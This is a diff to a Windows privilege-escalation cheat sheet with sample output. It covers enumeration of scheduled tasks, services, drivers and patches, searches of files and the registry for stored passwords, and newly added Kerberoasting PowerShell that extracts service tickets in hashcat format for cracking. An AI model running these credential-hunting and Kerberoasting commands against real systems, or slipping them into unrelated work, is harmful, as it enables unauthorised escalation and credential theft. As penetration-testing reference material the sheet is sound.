@@ -1,5 +1,10 @@
-# Windows Priv Esc Commands 
-1. ##### Look for schduled tasks we can alter by path? they run at system:
+# Windows Priv Esc Commands
+
+## Host Privilege Escalation
+
+### Schduled Tasks Path Alteration
+Schduled tasks we can alter by path? They run at system context:
+
 ```schtasks /query /fo LIST /v```
 ```
 C:\Users\KILLSWITCH-GUI>schtasks /query /fo LIST /v
@@ -36,9 +41,9 @@ Repeat: Stop If Still Running:        N/A
 <snip>
 ```
 
+### Evaluating Vulnerable Services
+We can use the `net start` command to evaluate services on the system:
 
-2. ##### Look for vuln services:
- ```net start```
 ```
 C:\Users\KILLSWITCH-GUI>net start
 These Windows services are started:
@@ -59,9 +64,11 @@ These Windows services are started:
    Contact Data_7e8e2a
    CoreMessaging
    <SNIP>
-   ```
+```
 
-3. ##### Look for vuln drivers loaded, we offten dont spend enough time looking at this:
+### Evaluating Vulnerable Drivers
+Look for vuln drivers loaded, we often don't spend enough time looking at this:
+
 ```DRIVERQUERY /FO table```
 ```
 C:\Users\KILLSWITCH-GUI>DRIVERQUERY /FO table
@@ -80,7 +87,8 @@ ADP80XX      ADP80XX                Kernel        4/9/2015 4:49:48 PM
 <SNIP>
 ```
 
-4. ##### Look for KB / Patches installed or not:
+### Evaluating KBs/Patches
+Look for KB / Patches installed or not:
 ```wmic qfe get Caption,Description,HotFixID,InstalledOn```
 ```
 C:\Users\KILLSWITCH-GUI>wmic qfe get Caption,Description,HotFixID,InstalledOn
@@ -97,7 +105,8 @@ C:\Users\KILLSWITCH-GUI> wmic qfe get Caption,Description,HotFixID,InstalledOn |
 http://support.microsoft.com/?kbid=4022405  Update           KB4022405  6/8/2017
 ```
 
-5. ##### Look for unattended configs in the following dirs:
+### Locating Unattended configs
+Look for unattended configs in the following dirs:
 ```
 c:\sysprep.inf
 c:\sysprep\sysprep.xml
@@ -105,14 +114,16 @@ c:\sysprep\sysprep.xml
 %WINDIR%\Panther\Unattended.xml
 ```
 
-6. ##### Look for AlwaysInstallElevated key set to DWORD 1:
+### Locating AlwaysInstallElevated 
+key set to DWORD 1:
 ```reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated```
 ```
 C:\Users\KILLSWITCH-GUI>reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
 ERROR: The system was unable to find the specified registry key or value.
 ```
 
-7. ##### Search the file system for file names containing certain keywords via cmd:
+### Locating Sensitive Files
+Search the file system for file names containing certain keywords via cmd:
 ```dir /s *pass* == *cred* == *vnc* == *.config*```
 ```
 C:\Users\KILLSWITCH-GUI>dir /s *pass* == *cred* == *vnc* == *.config*
@@ -125,7 +136,8 @@ C:\Users\KILLSWITCH-GUI>dir /s *pass* == *cred* == *vnc* == *.config*
                0 File(s)              0 bytes
 ```
 
-8. ##### Search certain file types for a keyword via cmd:
+### Locating Sensitive Data In Files
+Search certain file types for a keyword via cmd:
 ```findstr /si password *.xml *.ini *.txt```
 ```
 C:\Users\KILLSWITCH-GUI>findstr /si password *.xml *.ini *.txt
@@ -133,7 +145,7 @@ C:\Users\KILLSWITCH-GUI>findstr /si password *.xml *.ini *.txt
 AppData\Local\lxss\rootfs\usr\share\dbus-1\interfaces\org.freedesktop.Accounts.User.xml:  <method name="SetPasswordMode">
 ```
 
-9. #####  Search for passwords in the reg:
+### Locating Passwords Within Thhe Registry
 ```
 reg query HKLM /f password /t REG_SZ /s
 reg query HKCU /f password /t REG_SZ /s
@@ -148,7 +160,7 @@ HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\{2135f72a-90b5-4ed3-a7f1-8bb705ac276a}
     (Default)    REG_SZ    PicturePasswordLogonProvider
 ```
 
-10. #####  Search for unquoted service paths:
+###  Locating Unquoted Service Paths
 ```wmic service get name,startmode,pathname | findstr /i /v ":\windows\" | findstr /v """```
 ```
 C:\Users\KILLSWITCH-GUI>wmic service get name,startmode,pathname | findstr /i /v ":\windows\" | findstr /v """
@@ -159,3 +171,20 @@ AppIDSvc                                  C:\WINDOWS\system32\svchost.exe -k Loc
 ```
 
 ---
+
+## Domain Privilege Escalation
+
+### Kerbroasting
+https://gist.github.com/HarmJ0y/cc1004307157e372fc5bd3f89e553059
+
+#### Kerbroast a domain and set for crashing is hashcat format:
+```powershell
+Invoke-Kerberoast -OutputFormat Hashcat | fl
+```
+
+#### ACL rights to set a SPN on user account and crack via SPN kerb ticket:
+```powershell
+1. Set-DomainObject -Identity 'user' -set@{serviceprincipalname='blah\blah'}
+2. Invoke-Kerberoast -Identity 'user' -OutputFormat hashcat | fl ==alternative command:== Get-DomainUser -Identity 'user' | Get-DomainSPNTicket 
+3. Set-DomainObject -Identity 'user' -Clear serviceprincipalname
+```
